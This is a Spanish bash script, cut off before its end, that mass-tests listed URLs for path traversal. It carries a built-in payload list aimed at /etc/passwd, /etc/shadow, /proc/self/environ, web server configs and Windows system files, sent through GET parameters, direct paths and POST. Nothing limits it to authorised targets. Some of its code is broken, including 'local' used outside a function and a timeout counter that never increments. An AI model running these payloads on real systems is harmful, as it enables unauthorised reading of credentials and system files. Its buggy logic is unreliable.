#!/bin/bash
# advanced_path_traversal_tester.sh
# Script completo para detectar y confirmar vulnerabilidades de Path Traversal
# Lee URLs desde archivo url.txt (una por línea)
# Lee vectores desde archivo pathtraversal.txt

URL_FILE="${1:-url.txt}"
VECTORS_FILE="${2:-pathtraversal.txt}"
MASTER_OUTPUT="/tmp/path_traversal_master_report_$$.txt"
TIMEOUT=5
CONNECT_TIMEOUT=10
MAX_TIME=30

# Verificar que los archivos existen
if [ ! -f "$URL_FILE" ]; then
    echo "Error: Archivo $URL_FILE no encontrado"
    echo "Creando archivo de ejemplo..."
    echo "https://ejemplo1.com" > url.txt
    echo "http://ejemplo2.com" >> url.txt
    echo "http://192.168.1.100" >> url.txt
    echo "Archivo de ejemplo creado. Edita 'url.txt' con tus URLs."
    exit 1
fi

if [ ! -f "$VECTORS_FILE" ]; then
    echo "Error: Archivo $VECTORS_FILE no encontrado"
    echo "Creando archivo de vectores por defecto..."
    cat > "$VECTORS_FILE" << 'EOF'
# Archivo de vectores de Path Traversal
# Formato: <tipo>|<descripción>|<vector>
# Tipos: basic, encoded, nullbyte, advanced, windows, custom

# Vectores básicos Linux
basic|Basic 3 levels|../../../etc/passwd
basic|Basic 4 levels|../../../../etc/passwd
basic|Basic 5 levels|../../../../../etc/passwd
basic|Basic 6 levels|../../../../../../etc/passwd
basic|Basic etc/shadow|../../../etc/shadow
basic|Basic etc/hosts|../../../etc/hosts
basic|Basic /proc/self/environ|../../../proc/self/environ
basic|Basic apache config|../../../etc/apache2/apache2.conf
basic|Basic nginx config|../../../etc/nginx/nginx.conf

# Encoding básico
encoded|URL encoded|..%2f..%2f..%2fetc%2fpasswd
encoded|Double URL encoded|..%252f..%252f..%252fetc%252fpasswd
encoded|Dot encoded|%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
encoded|Backslash encoded|..%5c..%5c..%5cetc%5cpasswd

# Null byte injection
nullbyte|Null byte simple|../../../etc/passwd%00
nullbyte|Null byte with extension|../../../etc/passwd%00.jpg
nullbyte|Null byte with txt|../../../etc/passwd%00.txt
nullbyte|Null byte win.ini|../../../windows/win.ini%00

# Técnicas avanzadas
advanced|Double encoding|..%252f..%252f..%252fetc/passwd
advanced|Dot slash|%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
advanced|Double dot slash|....//....//....//etc//passwd
advanced|Semicolon|..;/..;/..;/etc/passwd
advanced|Backslashes|..\\..\\..\\etc\\passwd
advanced|Absolute path|/etc/passwd

# Vectores Windows
windows|Windows win.ini|../../../windows/win.ini
windows|Windows hosts|../../../windows/system32/drivers/etc/hosts
windows|Windows boot.ini|../../boot.ini
windows|Windows C drive|C:/boot.ini
windows|Windows absolute|C:/Windows/System32/drivers/etc/hosts

# Vectores personalizados
custom|PHP filter|php://filter/convert.base64-encode/resource=../../../etc/passwd
custom|LFI with wrapper|file:///etc/passwd
custom|Path with spaces|..%20/..%20/..%20/etc/passwd
EOF
    echo "Archivo de vectores creado: $VECTORS_FILE"
    echo "Puedes editar este archivo para agregar más vectores."
fi

# Contar URLs y vectores
URL_COUNT=$(grep -v '^#' "$URL_FILE" | grep -v '^$' | wc -l)
VECTOR_COUNT=$(grep -v '^#' "$VECTORS_FILE" | grep -v '^$' | wc -l)

echo "=================================================="
echo "    DETECTOR AVANZADO DE PATH TRAVERSAL"
echo "    Archivo de URLs: $URL_FILE ($URL_COUNT URLs)"
echo "    Archivo de vectores: $VECTORS_FILE ($VECTOR_COUNT vectores)"
echo "    Timeout conexión: ${CONNECT_TIMEOUT}s"
echo "    Timeout total: ${MAX_TIME}s"
echo "=================================================="
echo ""

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Funciones de utilidad
print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

# Cargar vectores desde archivo
declare -A VECTORS_BASIC VECTORS_ENCODED VECTORS_NULLBYTE VECTORS_ADVANCED VECTORS_WINDOWS VECTORS_CUSTOM

load_vectors() {
    local vectors_file="$1"
    
    while IFS='|' read -r type description vector; do
        # Limpiar comentarios y espacios
        type=$(echo "$type" | sed 's/#.*//' | xargs)
        description=$(echo "$description" | sed 's/#.*//' | xargs)
        vector=$(echo "$vector" | sed 's/#.*//' | xargs)
        
        [ -z "$type" ] || [ -z "$vector" ] && continue
        
        case "$type" in
            basic)
                VECTORS_BASIC["$description"]="$vector"
                ;;
            encoded)
                VECTORS_ENCODED["$description"]="$vector"
                ;;
            nullbyte)
                VECTORS_NULLBYTE["$description"]="$vector"
                ;;
            advanced)
                VECTORS_ADVANCED["$description"]="$vector"
                ;;
            windows)
                VECTORS_WINDOWS["$description"]="$vector"
                ;;
            custom)
                VECTORS_CUSTOM["$description"]="$vector"
                ;;
            *)
                print_warning "Tipo de vector desconocido: $type"
                ;;
        esac
    done < <(grep -v '^#' "$vectors_file" | grep -v '^$')
    
    # Mostrar resumen de vectores cargados
    echo "Vectores cargados:"
    echo "  Basic: ${#VECTORS_BASIC[@]}"
    echo "  Encoded: ${#VECTORS_ENCODED[@]}"
    echo "  Nullbyte: ${#VECTORS_NULLBYTE[@]}"
    echo "  Advanced: ${#VECTORS_ADVANCED[@]}"
    echo "  Windows: ${#VECTORS_WINDOWS[@]}"
    echo "  Custom: ${#VECTORS_CUSTOM[@]}"
    echo ""
}

test_connection() {
    local url="$1"
    local output_file="$2"
    
    print_info "Probando conexión a $url..."
    
    # Intentar conectar con timeout reducido
    response=$(timeout $CONNECT_TIMEOUT curl -s -k -I -w "|HTTP_STATUS:%{http_code}|TIME:%{time_total}" "$url" 2>&1)
    
    # Verificar si hay timeout
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "CONEXIÓN: Timeout (${CONNECT_TIMEOUT}s)" >> "$output_file"
        print_warning "Timeout al conectar con $url"
        return 1
    fi
    
    # Verificar otros errores de conexión
    if echo "$response" | grep -q "Could not resolve host\|Failed to connect\|Connection refused"; then
        echo "CONEXIÓN: Error - Host no alcanzable" >> "$output_file"
        print_warning "No se puede conectar a $url"
        return 1
    fi
    
    # Verificar si recibimos respuesta HTTP
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    
    if [ -n "$http_status" ]; then
        time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
        echo "CONEXIÓN: OK (HTTP $http_status, ${time_total}s)" >> "$output_file"
        print_success "Conexión exitosa a $url (HTTP $http_status)"
        return 0
    else
        echo "CONEXIÓN: Error - No response" >> "$output_file"
        print_warning "No se recibió respuesta de $url"
        return 1
    fi
}

test_path_traversal() {
    local url="$1"
    local description="$2"
    local output_file="$3"
    local test_number="$4"
    local vector_type="$5"

    echo "" >> "$output_file"
    echo "=== Test $test_number: $vector_type - $description ===" >> "$output_file"
    echo "URL: $url" >> "$output_file"
    echo "Vector: $description" >> "$output_file"

    # Realizar petición con múltiples timeouts
    response=$(timeout $MAX_TIME curl -s -k --connect-timeout $CONNECT_TIMEOUT -m $MAX_TIME -w "|HTTP_STATUS:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}" "$url" 2>&1)
    
    # Verificar errores de timeout
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "RESULTADO: Timeout (${MAX_TIME}s)" >> "$output_file"
        print_warning "Timeout en test $test_number: $description"
        return 4
    fi
    
    # Verificar otros errores de curl
    if echo "$response" | grep -q "curl:"; then
        error_msg=$(echo "$response" | grep "curl:" | head -1)
        echo "RESULTADO: Error curl - $error_msg" >> "$output_file"
        print_warning "Error en test $test_number: $error_msg"
        return 5
    fi

    # Extraer información de la respuesta
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    response_size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
    time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
    content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')

    echo "HTTP Status: ${http_status:-N/A}" >> "$output_file"
    echo "Response Size: ${response_size:-0} bytes" >> "$output_file"
    echo "Response Time: ${time_total:-0}s" >> "$output_file"

    # Analizar respuesta
    if [ "$http_status" = "200" ]; then
        if [ -n "$content" ]; then
            # Patrones para detectar éxito
            local success_patterns="root:|daemon:|bin:|sys:|nobody:|Administrator:|\[boot loader\]|\[fonts\]|\[extensions\]|127.0.0.1.*localhost"
            
            # Verificar si el contenido coincide con algún patrón de éxito
            if echo "$content" | grep -i -q -E "$success_patterns"; then
                print_success "¡VULNERABLE! Path traversal confirmado"
                echo "RESULTADO: VULNERABLE" >> "$output_file"
                echo "INDICADOR ENCONTRADO: $(echo "$content" | grep -i -E "$success_patterns" | head -1)" >> "$output_file"
                echo "CONTENT (first 10 lines):" >> "$output_file"
                echo "$content" | head -20 >> "$output_file"
                echo "---" >> "$output_file"
                return 0
            elif [ "$response_size" -gt 1000 ] && [ "$response_size" -lt 100000 ]; then
                print_warning "Respuesta larga ($response_size bytes) - Posible éxito"
                echo "RESULTADO: SUSPICIOUS (large response)" >> "$output_file"
                echo "Primeras líneas:" >> "$output_file"
                echo "$content" | head -10 >> "$output_file"
                return 1
            else
                echo "RESULTADO: OK (no signs of vulnerability)" >> "$output_file"
                # Guardar muestra del contenido para análisis manual
                echo "SAMPLE (first 5 lines):" >> "$output_file"
                echo "$content" | head -5 >> "$output_file"
            fi
        else
            echo "RESULTADO: OK (empty response)" >> "$output_file"
        fi
    elif [ -n "$http_status" ]; then
        case "$http_status" in
            403|404)
                echo "RESULTADO: Blocked (HTTP $http_status)" >> "$output_file"
                ;;
            500)
                print_warning "Error 500 - Posible vector válido pero con error"
                echo "RESULTADO: Error 500" >> "$output_file"
                # Guardar error para análisis
                echo "ERROR CONTENT:" >> "$output_file"
                echo "$content" | head -5 >> "$output_file"
                return 2
                ;;
            400)
                echo "RESULTADO: Bad Request (HTTP 400)" >> "$output_file"
                ;;
            401|407)
                echo "RESULTADO: Authentication Required (HTTP $http_status)" >> "$output_file"
                ;;
            30[0-9])
                echo "RESULTADO: Redirect (HTTP $http_status)" >> "$output_file"
                ;;
            *)
                echo "RESULTADO: HTTP $http_status" >> "$output_file"
                ;;
        esac
    else
        echo "RESULTADO: No HTTP response" >> "$output_file"
    fi

    return 3
}

# Función para probar vectores con diferentes parámetros
test_vector_with_params() {
    local base_url="$1"
    local vector="$2"
    local description="$3"
    local vector_type="$4"
    local output_file="$5"
    local test_number="$6"
    
    local params="file path src doc filename page template include"
    local successes=0
    
    for param in $params; do
        local test_url="${base_url}?${param}=${vector}"
        test_path_traversal "$test_url" "$description (param: $param)" "$output_file" "${test_number}.${param}" "$vector_type"
        if [ $? -eq 0 ]; then
            successes=$((successes + 1))
        fi
    done
    
    # También probar acceso directo si el vector parece una ruta
    if [[ "$vector" == /* ]] || [[ "$vector" == ..* ]] || [[ "$vector" == *%* ]]; then
        test_path_traversal "${base_url}${vector}" "$description (direct)" "$output_file" "${test_number}.direct" "$vector_type"
        [ $? -eq 0 ] && successes=$((successes + 1))
    fi
    
    return $successes
}

# Cargar vectores
load_vectors "$VECTORS_FILE"

# Variables para resumen global
TOTAL_VULNERABLE=0
TOTAL_TIMEOUT=0
TOTAL_ERRORS=0
VULNERABLE_URLS=""
TIMEOUT_URLS=""
ERROR_URLS=""
SAFE_URLS=""

# Procesar cada URL del archivo
URL_NUMBER=0

while IFS= read -r TARGET || [ -n "$TARGET" ]; do
    # Saltar líneas vacías y comentarios
    TARGET=$(echo "$TARGET" | sed 's/#.*//' | xargs)
    [ -z "$TARGET" ] && continue
    
    URL_NUMBER=$((URL_NUMBER + 1))
    
    echo ""
    echo "=================================================="
    echo "    ANALIZANDO URL $URL_NUMBER de $URL_COUNT"
    echo "    Target: $TARGET"
    echo "    Vectores a probar: $VECTOR_COUNT"
    echo "=================================================="
    
    # Crear archivo de salida para esta URL
    URL_SANITIZED=$(echo "$TARGET" | sed 's/[^a-zA-Z0-9]/_/g')
    URL_OUTPUT="/tmp/path_traversal_${URL_SANITIZED}_$$.txt"
    
    # Inicio del análisis para esta URL
    print_info "Iniciando análisis de Path Traversal..."
    echo "Reporte de Path Traversal - $(date)" > "$URL_OUTPUT"
    echo "Target: $TARGET" >> "$URL_OUTPUT"
    echo "Vectors file: $VECTORS_FILE" >> "$URL_OUTPUT"
    echo "Vectors loaded: $VECTOR_COUNT" >> "$URL_OUTPUT"
    echo "Timeout conexión: ${CONNECT_TIMEOUT}s" >> "$URL_OUTPUT"
    echo "Timeout total: ${MAX_TIME}s" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Listar vectores cargados
    echo "VECTORS TO TEST:" >> "$URL_OUTPUT"
    for type in basic encoded nullbyte advanced windows custom; do
        declare -n vectors="VECTORS_${type^^}"
        if [ ${#vectors[@]} -gt 0 ]; then
            echo "  $type: ${#vectors[@]}" >> "$URL_OUTPUT"
        fi
    done
    echo "" >> "$URL_OUTPUT"
    
    # Primero probar conexión básica
    if ! test_connection "$TARGET" "$URL_OUTPUT"; then
        print_error "No se pudo conectar a $TARGET - Saltando..."
        TOTAL_ERRORS=$((TOTAL_ERRORS + 1))
        ERROR_URLS="${ERROR_URLS}\n- $TARGET (conexión fallida)"
        
        # Agregar al reporte maestro
        echo "==================================================" >> "$MASTER_OUTPUT"
        echo "URL: $TARGET" >> "$MASTER_OUTPUT"
        echo "Estado: CONNECTION_ERROR" >> "$MASTER_OUTPUT"
        echo "Error: No se pudo establecer conexión" >> "$MASTER_OUTPUT"
        echo "Reporte: $URL_OUTPUT" >> "$MASTER_OUTPUT"
        continue
    fi
    
    # Variables para esta URL
    declare -A SUCCESS_BY_TYPE
    SUCCESS_BY_TYPE[basic]=0
    SUCCESS_BY_TYPE[encoded]=0
    SUCCESS_BY_TYPE[nullbyte]=0
    SUCCESS_BY_TYPE[advanced]=0
    SUCCESS_BY_TYPE[windows]=0
    SUCCESS_BY_TYPE[custom]=0
    
    test_timeout=0
    test_error=0
    TEST_COUNTER=0
    
    # Función para probar un grupo de vectores
    test_vector_group() {
        local vector_type="$1"
        declare -n vectors="VECTORS_${vector_type^^}"
        
        if [ ${#vectors[@]} -eq 0 ]; then
            return 0
        fi
        
        print_info "Probando vectores $vector_type (${#vectors[@]} vectores)..."
        echo "" >> "$URL_OUTPUT"
        echo "=== TESTING $vector_type VECTORS ===" >> "$URL_OUTPUT"
        
        local group_success=0
        
        for description in "${!vectors[@]}"; do
            local vector="${vectors[$description]}"
            TEST_COUNTER=$((TEST_COUNTER + 1))
            
            echo "" >> "$URL_OUTPUT"
            echo "--- Vector $TEST_COUNTER: $description ---" >> "$URL_OUTPUT"
            
            # Probar con diferentes métodos
            local successes=0
            
            # Método 1: Como parámetro GET
            for param in file path src; do
                local test_url="${TARGET}?${param}=${vector}"
                test_path_traversal "$test_url" "$description (GET $param)" "$URL_OUTPUT" "$TEST_COUNTER.$param" "$vector_type"
                [ $? -eq 0 ] && successes=$((successes + 1))
            done
            
            # Método 2: Acceso directo (si parece una ruta)
            if [[ "$vector" =~ ^(\.\.|/|%|\\\\) ]]; then
                local test_url="${TARGET}${vector}"
                test_path_traversal "$test_url" "$description (direct)" "$URL_OUTPUT" "$TEST_COUNTER.direct" "$vector_type"
                [ $? -eq 0 ] && successes=$((successes + 1))
            fi
            
            # Método 3: POST (solo para algunos vectores)
            if [[ "$vector_type" == "basic" ]] || [[ "$vector_type" == "nullbyte" ]]; then
                echo "" >> "$URL_OUTPUT"
                echo "Testing POST with vector..." >> "$URL_OUTPUT"
                response=$(timeout $MAX_TIME curl -s -k --connect-timeout $CONNECT_TIMEOUT -m $MAX_TIME -X POST -d "file=${vector}" -w "|HTTP_STATUS:%{http_code}" "$TARGET" 2>&1)
                
                if ! echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
                    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
                    if [ "$http_status" = "200" ]; then
                        content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')
                        if echo "$content" | grep -i -q -E "root:|\[boot loader\]"; then
                            echo "RESULTADO: VULNERABLE via POST" >> "$URL_OUTPUT"
                            successes=$((successes + 1))
                        fi
                    fi
                fi
            fi
            
            if [ $successes -gt 0 ]; then
                group_success=$((group_success + 1))
                SUCCESS_BY_TYPE[$vector_type]=$((SUCCESS_BY_TYPE[$vector_type] + 1))
                print_success "Vector $vector_type exitoso: $description"
            fi
            
            # Control de timeouts
            if [ $test_timeout -ge 5 ]; then
                print_warning "Demasiados timeouts, continuando con siguiente tipo de vector"
                break
            fi
            
            # Pequeña pausa entre vectores
            sleep 0.1
        done
        
        return $group_success
    }
    
    # Probar cada tipo de vector
    for type in basic encoded nullbyte advanced windows custom; do
        test_vector_group "$type"
        
        # Si hay muchos timeouts, saltar al siguiente URL
        if [ $test_timeout -ge 5 ]; then
            print_error "Demasiados timeouts para $TARGET - Saltando al siguiente URL"
            break
        fi
    done
    
    # ============================================================================
    # RESUMEN PARA ESTA URL
    # ============================================================================
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "                RESUMEN DEL ANÁLISIS" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    echo "Total tests realizados: $TEST_COUNTER" >> "$URL_OUTPUT"
    echo "Tests con timeout: $test_timeout" >> "$URL_OUTPUT"
    echo "Tests con error: $test_error" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Calcular vulnerabilidades totales
    local vuln_count=0
    for type in "${!SUCCESS_BY_TYPE[@]}"; do
        [ ${SUCCESS_BY_TYPE[$type]} -gt 0 ] && vuln_count=$((vuln_count + 1))
    done
    
    echo "VULNERABILIDADES DETECTADAS POR TIPO:" >> "$URL_OUTPUT"
    for type in basic encoded nullbyte advanced windows custom; do
        echo "  $type: ${SUCCESS_BY_TYPE[$type]} vectores exitosos" >> "$URL_OUTPUT"
    done
    echo "" >> "$URL_OUTPUT"
    
    echo "Total de tipos de vectores exitosos: $vuln_count/6" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Agregar al reporte maestro
    echo "==================================================" >> "$MASTER_OUTPUT"
    echo "URL: $TARGET" >> "$MASTER_OUTPUT"
    
    if [ $test_timeout -ge 5 ]; then
        echo "Estado: TIMEOUT" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        TOTAL_TIMEOUT=$((TOTAL_TIMEOUT + 1))
        TIMEOUT_URLS="${TIMEOUT_URLS}\n- $TARGET ($test_timeout timeouts)"
    elif [ $vuln_count -gt 0 ]; then
        echo "Estado: VULNERABLE" >> "$MASTER_OUTPUT"
        echo "Tipos de vectores exitosos: $vuln_count/6" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        TOTAL_VULNERABLE=$((TOTAL_VULNERABLE + 1))
        
        # Detalle de vectores exitosos
        local success_detail=""
        for type in "${!SUCCESS_BY_TYPE[@]}"; do
            if [ ${SUCCESS_BY_TYPE[$type]} -gt 0 ]; then
                success_detail="${success_detail} ${type}:${SUCCESS_BY_TYPE[$type]}"
            fi
        done
        VULNERABLE_URLS="${VULNERABLE_URLS}\n- $TARGET ($vuln_count tipos:${success_detail})"
        
        echo "Vectores exitosos por tipo:" >> "$MASTER_OUTPUT"
        for type in basic encoded nullbyte advanced windows custom; do
            [ ${SUCCESS_BY_TYPE[$type]} -gt 0 ] && echo "  - $type: ${SUCCESS_BY_TYPE[$type]}" >> "$MASTER_OUTPUT"
        done
    else
        echo "Estado: SAFE" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        SAFE_URLS="${SAFE_URLS}\n- $TARGET"
    fi
    
    echo "Reporte detallado: $URL_OUTPUT" >> "$MASTER_OUTPUT"
    
    # Resultado final para esta URL
    if [ $vuln_count -gt 0 ]; then
        print_error "¡VULNERABILIDAD DE PATH TRAVERSAL CONFIRMADA!"
        echo "ESTADO: ${RED}VULNERABLE${NC}" >> "$URL_OUTPUT"
        echo "El servidor es vulnerable a Path Traversal" >> "$URL_OUTPUT"
        
        echo "" >> "$URL_OUTPUT"
        echo "VECTORES EXITOSOS:" >> "$URL_OUTPUT"
        for type in "${!SUCCESS_BY_TYPE[@]}"; do
            if [ ${SUCCESS_BY_TYPE[$type]} -gt 0 ]; then
                echo "  - $type: ${SUCCESS_BY_TYPE[$type]} vectores" >> "$URL_OUTPUT"
            fi
        done
        
        echo "" >> "$URL_OUTPUT"
        echo "IMPACTO:" >> "$URL_OUTPUT"
        echo "• Lectura de archivos sensibles del sistema" >> "$URL_OUTPUT"
        echo "• Posible escalada a RCE (Remote Code Execution)" >> "$URL_OUTPUT"
        echo "• Exposición de información crítica" >> "$URL_OUTPUT"
        echo "• Violación de confidencialidad" >> "$URL_OUTPUT"
    
        echo "" >> "$URL_OUTPUT"
        echo "RECOMENDACIONES INMEDIATAS:" >> "$URL_OUTPUT"
        echo "1. Validar y sanitizar todas las entradas de usuario" >> "$URL_OUTPUT"
        echo "2. Implementar whitelist de caracteres permitidos" >> "$URL_OUTPUT"
        echo "3. Usar rutas canónicas absolutas" >> "$URL_OUTPUT"
        echo "4. Implementar WAF (Web Application Firewall)" >> "$URL_OUTPUT"
        echo "5. Restringir acceso a directorios del sistema" >> "$URL_OUTPUT"
        echo "6. Actualizar todos los componentes del servidor" >> "$URL_OUTPUT"
    elif [ $test_timeout -ge 3 ]; then
        print_warning "Múltiples timeouts detectados"
        echo "ESTADO: ${YELLOW}TIMEOUT${NC}" >> "$URL_OUTPUT"
        echo "El servidor responde lentamente o tiene problemas de conexión" >> "$URL_OUTPUT"
    else
        print_success "No se encontraron vulnerabilidades de Path Traversal"
        echo "ESTADO: ${GREEN}SAFE${NC}" >> "$URL_OUTPUT"
        echo "El servidor parece estar protegido contra Path Traversal" >> "$URL_OUTPUT"
    fi
    
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "Análisis completado: $(date)" >> "$URL_OUTPUT"
    echo "Tiempo total estimado: ~$((TEST_COUNTER * 2))s" >> "$URL_OUTPUT"
    
    # Mostrar resumen de esta URL en pantalla
    echo ""
    echo "Resumen para $TARGET:"
    echo "  Tests realizados: $TEST_COUNTER"
    echo "  Timeouts: $test_timeout"
    echo "  Estado: $([ $vuln_count -gt 0 ] && echo -e "${RED}VULNERABLE${NC}" || ([ $test_timeout -ge 3 ] && echo -e "${YELLOW}TIMEOUT${NC}") || echo -e "${GREEN}SAFE${NC}")"
    echo "  Tipos exitosos: $vuln_count/6"
    for type in "${!SUCCESS_BY_TYPE[@]}"; do
        if [ ${SUCCESS_BY_TYPE[$type]} -gt 0 ]; then
            echo "    $type: ${SUCCESS_BY_TYPE[$type]} vectores"
        fi
    done
    echo "  Reporte detallado: $URL_OUTPUT"
    echo ""
    
    # Pequeña pausa entre URLs para no saturar
    sleep 1
    
done < <(grep -v '^#' "$URL_FILE" | grep -v '^$')

# ============================================================================
# RESUMEN GLOBAL
# ============================================================================
echo ""
echo "=================================================="
echo "             RESUMEN GLOBAL DEL ANÁLISIS"
echo "=================================================="
echo "Archivo de URLs: $URL_FILE"
echo "Archivo de vectores: $VECTORS_FILE"
echo "Total de URLs en archivo: $URL_COUNT"
echo "URLs procesadas: $URL_NUMBER"
echo "Vectores cargados: $VECTOR_COUNT"
echo ""
echo "RESULTADOS:"
echo "  URLs vulnerables: $TOTAL_VULNERABLE"
echo "  URLs con timeout: $TOTAL_TIMEOUT"
echo "  URLs con error conexión: $TOTAL_ERRORS"
echo "  URLs seguras: $((URL_NUMBER - TOTAL_VULNERABLE - TOTAL_TIMEOUT - TOTAL_ERRORS))"
echo ""

if [ $TOTAL_VULNERABLE -gt 0 ]; then
    echo -e "${RED}URLs VULNERABLES:${NC}"
    echo -e "$VULNERABLE_URLS"
    echo ""
fi

if [ $TOTAL_TIMEOUT -gt 0 ]; then
    echo -e "${YELLOW}URLs CON TIMEOUT:${NC}"
    echo -e "$TIMEOUT_URLS"
    echo ""
fi

if [ $TOTAL_ERRORS -gt 0 ]; then
    echo -e "${RED}URLs CON ERROR:${NC}"
    echo -e "$ERROR_URLS"
    echo ""
fi

if [ $((URL_NUMBER - TOTAL_VULNERABLE - TOTAL_TIMEOUT - TOTAL_ERRORS)) -gt 0 ]; then
    echo -e "${GREEN}URLs SEGURAS:${NC}"
    echo -e "$SAFE_URLS"
    echo ""
fi

# Generar reporte maestro final
MASTER_FINAL="/tmp/path_traversal_final_report_$$.txt"
echo "==================================================" > "$MASTER_FINAL"
echo "       REPORTE MAESTRO PATH TRAVERSAL" >> "$MASTER_FINAL"
echo "       Fecha: $(date)" >> "$MASTER_FINAL"
echo "       Configuración:" >> "$MASTER_FINAL"
echo "       - URLs: $URL_FILE" >> "$MASTER_FINAL"
echo "       - Vectores: $VECTORS_FILE" >> "$MASTER_FINAL"
echo "       - Timeout conexión: ${CONNECT_TIMEOUT}s" >> "$MASTER_FINAL"
echo "       - Timeout total: ${MAX_TIME}s" >> "$MASTER_FINAL"
echo "==================================================" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"
echo "ARCHIVOS DE ENTRADA:" >> "$MASTER_FINAL"
echo "  URLs: $URL_FILE ($URL_COUNT URLs)" >> "$MASTER_FINAL"
echo "  Vectores: $VECTORS_FILE ($VECTOR_COUNT vectores)" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"
echo "RESULTADOS:" >> "$MASTER_FINAL"
echo "  URLs procesadas: $URL_NUMBER" >> "$MASTER_FINAL"
echo "  URLs vulnerables: $TOTAL_VULNERABLE" >> "$MASTER_FINAL"
echo "  URLs con timeout: $TOTAL_TIMEOUT" >> "$MASTER_FINAL"
echo "  URLs con error conexión: $TOTAL_ERRORS" >> "$MASTER_FINAL"
echo "  URLs seguras: $((URL_NUMBER - TOTAL_VULNERABLE - TOTAL_TIMEOUT - TOTAL_ERRORS))" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"

if [ $TOTAL_VULNERABLE -gt 0 ]; then
    echo "URLs VULNERABLES:" >> "$MASTER_FINAL"
    echo -e "$VULNERABLE_URLS" | sed 's/\\n/\n/g' >> "$MASTER_FINAL"
    echo "" >> "$MASTER_FINAL"
fi

if [ $TOTAL_TIMEOUT -gt 0 ]; then
    echo "URLs CON TIMEOUT:" >> "$MASTER_FINAL"
    echo -e "$TIMEOUT_URLS" | sed 's/\\n/\n/g' >> "$MASTER_FINAL"
    echo "" >> "$MASTER_FINAL"
fi

if [ $TOTAL_ERRORS -gt 0 ]; then
